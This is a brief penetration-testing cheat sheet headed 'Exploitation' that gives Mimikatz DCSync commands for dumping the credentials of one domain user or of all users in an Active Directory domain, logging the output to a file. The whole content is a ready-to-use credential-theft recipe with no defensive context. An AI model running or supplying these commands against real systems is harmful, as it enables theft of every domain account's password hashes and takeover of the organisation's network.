

# Exploitation
- Mimikatz
```powershell
# Dump credentails for a single user
lsadump::dcsync /domain:mydomain.local /user:<username>

# Dump credentials of all the domain user
log myfile.txt
lsadump::dcsync /domain:mydomain.local /all
```